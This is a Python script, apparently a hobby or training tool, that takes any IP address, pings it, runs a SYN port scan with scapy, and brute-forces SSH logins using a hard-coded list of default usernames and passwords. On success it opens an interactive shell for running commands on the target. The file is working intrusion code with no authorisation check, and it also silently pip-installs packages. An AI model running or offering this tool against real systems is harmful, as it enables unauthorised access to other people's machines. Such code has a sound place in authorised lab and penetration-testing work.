import os

def install_packages(packages_list):
    for package in packages_list:
        try:
            __import__(package)
        except ModuleNotFoundError:
            print(f"{package.capitalize()} is not installed. Installing now...")
            os.system(f"pip install {package} > nul 2>&1")
            print(f"{package.capitalize()} has been installed successfully!")

install_packages(["scapy", "paramiko"])
from scapy.all import *
from paramiko import *
print("Disclaimer: If you see a WARNING, you need to go and install Npcap from 'www.npcap.com'.""\n"
      "            Restart is required after installation.")

def send_ping(target_ip):
    try:
        packet = IP(dst=target_ip) / ICMP()
        response = sr1(packet, timeout=5, verbose=0)
        if response:
            return True
        else:
            return False
    except Exception:
        return None

def check_target():
    while True:
        target_ip = input("Enter a target (IP address) to scan if it's up by sending a ping: ")
        result = send_ping(target_ip)
        if result is True:
            print("The target is up.\n")
            return target_ip
        elif result is False:
            print("The target is not responding. Please try again.\n")
        else:
            print("Error! Unable to reach the target. Please check the IP address and try again.\n")

def get_ports():
    scan_mode = input("Choose between TCP ports you want to scan (common/all): ").lower()
    if scan_mode == "common":
        ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445]
        return ports
    elif scan_mode == "all":
        ports = []
        for i in range(1, 65536):
            ports.append(i)
        return ports
    else:
        print("Invalid input. Please enter 'common' or 'all'.\n")
        return get_ports()

open_ports = []

def scan_tcp_ports(target_ip, ports_list):
    print("\nStarting TCP port scan...")
    for port in ports_list:
        packet = IP(dst=target_ip) / TCP(dport=port, flags="S")
        response = sr1(packet, timeout=0.5, verbose=0)
        if response and response.haslayer(TCP) and response["TCP"].flags == "SA":
            open_ports.append(port)
            print(f"{target_ip} on port {port} is: OPEN")
        else:
            print(f"{target_ip} on port {port} is: CLOSED")

def login_attempt(target_ip, open_ports):
    if 22 in open_ports:
        print("\nPort 22 is open.\nAttempting to log in.\nThis may take a while...\n")

        usernames = ["root", "toor", "opc", "kali", "admin", "user"]
        passwords = ["root", "toor", "R!9zP@3kV", "kali", "admin", "pass"]

        ssh = SSHClient()
        ssh.set_missing_host_key_policy(AutoAddPolicy())

        for username in usernames:
            for password in passwords:
                try:
                    ssh.connect(target_ip, port=22, username=username, password=password, banner_timeout=5, timeout=0.5)
                    print(f"Logged in successfully!\nUsername: {username}\nPassword: {password}")
                    return username, password
                except AuthenticationException:
                    continue
                except Exception as error:
                    print(f"Wrong attempt / {error}")
                finally:
                    ssh.close()
        return None, None
    else:
        print("\nPort 22 is not open.\nExiting the program.")
        exit()

def ssh_connect_and_execute(target_ip, username, password):
    ssh = SSHClient()
    ssh.set_missing_host_key_policy(AutoAddPolicy())
    try:
        ssh.connect(target_ip, port=22, username=username, password=password, banner_timeout=5, timeout=2)
        answer = input("\nWould you like to connect to the target's SSH? (yes/no): ").lower()
        if answer == "yes":
            while True:
                cmd = input('Enter a command to execute on the target (or "exit" to quit): ')
                if cmd.lower() == "exit":
                    print("Exiting the program.")
                    ssh.close()
                    break
                else:
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    output = stdout.read().decode()
                    error = stderr.read().decode()
                    if error:
                        print(f"Error executing command- {error}")
                    else:
                        print(output)
        elif answer == "no".lower():
            print("Exiting the program.")
            exit()
        else:
            print("Invalid input. Please enter 'yes' or 'no'.")
            return ssh_connect_and_execute(target_ip, username, password)
    except Exception as e:
        print(f"Error connecting to the target: {e}")

def main():
    print("\n===== Scanning Tool =====\n")
    target_ip = check_target()
    ports_list = get_ports()
    scan_tcp_ports(target_ip, ports_list)
    username, password = login_attempt(target_ip, open_ports)
    if username and password:
        ssh_connect_and_execute(target_ip, username, password)
    else:
        print("No successful logins found.\nExiting the program.")
        exit()

main()